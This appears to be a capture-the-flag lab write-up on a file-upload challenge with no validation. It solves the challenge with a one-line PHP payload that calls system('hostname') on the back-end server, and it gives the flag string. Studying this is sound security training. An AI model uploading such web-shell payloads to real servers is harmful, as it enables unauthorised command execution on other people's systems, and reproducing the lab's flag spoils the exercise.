## Challenge

Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer. 

## Solution

I create a php file which will execute the hostname command, by using the system function:

```sh
<?php system('hostname');?>
```

And upload this file to the app, then clicn on *Download* which shows me the hostname - flag `ng-621905-fileuploadsabsentverification-yxads-6d4876765-r428t`